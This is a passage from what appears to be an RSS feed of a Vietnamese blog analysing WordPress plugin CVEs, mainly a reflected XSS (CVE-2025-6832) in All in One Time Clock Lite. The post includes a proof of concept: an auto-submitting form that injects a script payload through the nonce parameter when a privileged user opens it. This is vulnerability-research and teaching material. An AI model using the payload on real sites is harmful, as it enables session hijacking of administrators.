0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;All in One Time Clock Lite&lt;/strong&gt;: &lt;strong&gt;v2.0&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;v2.0.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;strong&gt;Meld&lt;/strong&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;vulnerable&lt;/strong&gt;, tham s·ªë &lt;code&gt;nonce&lt;/code&gt; ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ &lt;code&gt;$_POST&lt;/code&gt; m√† &lt;strong&gt;kh√¥ng qua b·∫•t k·ª≥ sanitization n√†o&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = (isset($_POST[&amp;#34;nonce&amp;#34;])) ? $_POST[&amp;#34;nonce&amp;#34;] : null;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;patched&lt;/strong&gt;, tham s·ªë &lt;code&gt;nonce&lt;/code&gt; ƒë∆∞·ª£c x·ª≠ l√Ω b·∫±ng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_text_field/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt;&lt;/a&gt; tr∆∞·ªõc khi s·ª≠ d·ª•ng, ngƒÉn ch·∫∑n vi·ªác ch√®n m√£ ƒë·ªôc:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = (isset($_POST[&amp;#34;nonce&amp;#34;])) ? sanitize_text_field($_POST[&amp;#34;nonce&amp;#34;]) : null;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ B·∫£n v√° b·ªï sung l·ªõp l·ªçc ƒë·∫ßu v√†o cho bi·∫øn &lt;code&gt;nonce&lt;/code&gt;, ƒë·∫£m b·∫£o d·ªØ li·ªáu nh·∫≠n t·ª´ request s·∫Ω ƒë∆∞·ª£c lo·∫°i b·ªè k√Ω t·ª± nguy hi·ªÉm tr∆∞·ªõc khi x·ª≠ l√Ω ti·∫øp.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/diff.png&#34;&#xA;    alt=&#34;So s√°nh thay ƒë·ªïi m√£ gi·ªØa b·∫£n vulnerable v√† b·∫£n v√°&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;So s√°nh thay ƒë·ªïi m√£ gi·ªØa b·∫£n vulnerable v√† b·∫£n v√°&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;L·ªó h·ªïng n·∫±m trong h√†m &lt;code&gt;aio_time_clock_lite_js()&lt;/code&gt; thu·ªôc class &lt;code&gt;AIO_Time_Clock_Lite_Actions&lt;/code&gt; trong file &lt;code&gt;aio-time-clock-lite-actions.php&lt;/code&gt;{: .filepath}&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function aio_time_clock_lite_js()&#xA;{&#xA;    // other logic       &#xA;    $nonce = (isset($_POST[&amp;#34;nonce&amp;#34;])) ? $_POST[&amp;#34;nonce&amp;#34;] : null;&#xA;&#xA;    if (wp_verify_nonce($nonce, &amp;#39;time-clock-nonce&amp;#39;)) {&#xA;        // other logic            &#xA;    } else {&#xA;        echo json_encode(&#xA;            [&#xA;                &amp;#34;response&amp;#34;     =&amp;gt; &amp;#34;failed&amp;#34;,&#xA;                &amp;#34;message&amp;#34;      =&amp;gt; esc_attr_x(&amp;#34;Not authorized to perform this action&amp;#34;, &amp;#39;aio-time-clock-lite&amp;#39;),&#xA;                &amp;#34;nonce&amp;#34;        =&amp;gt; $nonce,&#xA;                &amp;#34;clock_action&amp;#34; =&amp;gt; $clock_action,&#xA;            ]&#xA;        );&#xA;    }&#xA;&#xA;    wp_reset_postdata();&#xA;    die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;aio-time-clock-lite-actions.php&amp;rdquo;}&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;wp_verify_nonce()&lt;/code&gt; so s√°nh gi√° tr·ªã &lt;code&gt;$nonce&lt;/code&gt; g·ª≠i t·ª´ client v·ªõi gi√° tr·ªã h·ª£p l·ªá m√† server ƒë√£ sinh ra tr∆∞·ªõc ƒë√≥ b·∫±ng h√†m &lt;code&gt;wp_create_nonce()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;time-clock-nonce&amp;#34; id=&amp;#34;time-clock-nonce&amp;#34; value=&amp;#34;&amp;lt;?php echo wp_create_nonce(&amp;#34;time-clock-nonce&amp;#34;); ?&amp;gt;&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{: file=&amp;ldquo;aio-settings.php&amp;rdquo;}&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu &lt;code&gt;$nonce&lt;/code&gt; kh√¥ng h·ª£p l·ªá =&amp;gt; nh·∫£y sang nh√°nh &lt;code&gt;else&lt;/code&gt; tr·∫£ v·ªÅ &lt;strong&gt;JSON&lt;/strong&gt; b√°o l·ªói ch·ª©a &lt;code&gt;$nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Click &lt;code&gt;2 references&lt;/code&gt; ta th·∫•y h√†m &lt;code&gt;public function aio_time_clock_lite_js()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi l√†m callback cho c√°c action hook:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/ref1.png&#34;&#xA;    alt=&#34;H√†m aio_time_clock_lite_js() ƒë∆∞·ª£c g·∫Øn v√†o hai hook Ajax (authenticated &amp;amp; unauthenticated)&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;H√†m aio_time_clock_lite_js() ƒë∆∞·ª£c g·∫Øn v√†o hai hook Ajax (authenticated &amp;amp; unauthenticated)&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_aio_time_clock_lite_js&lt;/code&gt;(authenticated).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_aio_time_clock_lite_js&lt;/code&gt;(unauthenticated). =&amp;gt; Focus&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: Tham s·ªë &lt;code&gt;nonce&lt;/code&gt; l·∫•y tr·ª±c ti·∫øp t·ª´ &lt;code&gt;$_POST&lt;/code&gt; (unauthenticated request).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: Gi√° tr·ªã &lt;code&gt;nonce&lt;/code&gt; ƒë∆∞·ª£c ph·∫£n chi·∫øu l·∫°i trong &lt;code&gt;echo json_encode(...)&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;G·ª≠i POST request (unauthenticated) ƒë·∫øn &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi c√°c &lt;strong&gt;params&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=aio_time_clock_lite_js&amp;amp;nonce=nonce_value&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Callback &lt;code&gt;aio_time_clock_lite_js()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra gi√° tr·ªã &lt;code&gt;nonce&lt;/code&gt; =&amp;gt; &lt;strong&gt;invalid&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Ph·∫£n chi·∫øu gi√° tr·ªã &lt;code&gt;nonce&lt;/code&gt; v√†o body b·∫±ng &lt;code&gt;echo json_encode(...)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;T·∫°o trang web ch·ª©a form submit:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;form action=&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;&#xA;  &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;action&amp;#34; value=&amp;#34;aio_time_clock_lite_js&amp;#34;&amp;gt;&#xA;  &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;nonce&amp;#34; value=&amp;#34;&amp;lt;svg onload=alert()&amp;gt;&amp;#34;&amp;gt;&#xA;&amp;lt;/form&amp;gt;&#xA;&amp;lt;script&amp;gt;document.forms[0].submit()&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;G·ª≠i link ƒë·∫øn trang web ch·ª©a form cho ng∆∞·ªùi d√πng cho d·∫∑c quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;Quan s√°t vi·ªác th·ª±c hi·ªán &lt;strong&gt;JavaScript&lt;/strong&gt; ƒë∆∞·ª£c ti√™m.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-07-cve-2025-6832/result.png&#34;&#xA;    alt=&#34;Result ‚Äî PoC execution screenshot&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Result ‚Äî PoC execution screenshot&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-6832&lt;/strong&gt; trong plugin &lt;strong&gt;All in One Time Clock Lite &amp;lt;= 2.0&lt;/strong&gt; cho ph√©p &lt;strong&gt;unauthenticated attacker&lt;/strong&gt; khai th√°c Reflected XSS th√¥ng qua tham s·ªë &lt;code&gt;nonce&lt;/code&gt;. B·∫£n v√° &lt;strong&gt;2.0.1&lt;/strong&gt; ƒë√£ th√™m &lt;code&gt;sanitize_text_field()&lt;/code&gt; ƒë·ªÉ l·ªçc input, ngƒÉn ch·∫∑n m√£ ƒë·ªôc ƒë∆∞·ª£c ph·∫£n chi·∫øu trong JSON response.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n &lt;strong&gt;sanitize&lt;/strong&gt; v√† &lt;strong&gt;escape&lt;/strong&gt; d·ªØ li·ªáu tr∆∞·ªõc khi tr·∫£ v·ªÅ response.&lt;/li&gt;&#xA;&lt;li&gt;Endpoint m·ªü cho &lt;strong&gt;nopriv (unauthenticated)&lt;/strong&gt; c·∫ßn ƒë∆∞·ª£c xem x√©t c·∫©n tr·ªçng.&lt;/li&gt;&#xA;&lt;li&gt;Reflected XSS th∆∞·ªùng xu·∫•t hi·ªán khi gi√° tr·ªã input ƒë∆∞·ª£c ph·∫£n chi·∫øu tr·ª±c ti·∫øp trong output (JSON/HTML).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Update plugin&lt;/strong&gt; k·ªãp th·ªùi l√† c√°ch ƒë∆°n gi·∫£n nh·∫•t ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet ‚Äî PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/aio-time-clock-lite/vulnerability/wordpress-all-in-one-time-clock-lite-tracking-employee-time-has-never-been-easier-plugin-2-0-reflected-cross-site-scripting-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress All in One Time Clock Lite &amp;lt;= 2.0 ‚Äî CVE-2025-6832&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10146 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-06-cve-2025-10146/</link>
      <pubDate>Mon, 06 Oct 2025 19:18:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-06-cve-2025-10146/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng trong plugin &lt;strong&gt;Download Manager&lt;/strong&gt; tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;3.3.24&lt;/strong&gt;. D·ªØ li·ªáu ƒë∆∞·ª£c l·∫•y t·ª´ &lt;strong&gt;GET&lt;/strong&gt; request ƒë∆∞·ª£c in tr·ª±c ti·∫øp v√†o &lt;strong&gt;HTML attribute&lt;/strong&gt;, &lt;strong&gt;reflected XSS&lt;/strong&gt; x·∫£y ra khi ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn truy c·∫≠p v√†o ƒë∆∞·ªùng d·∫´n do attack cung c·∫•p.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10146&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10146&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/download-manager&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Download Manager Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.3.23&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 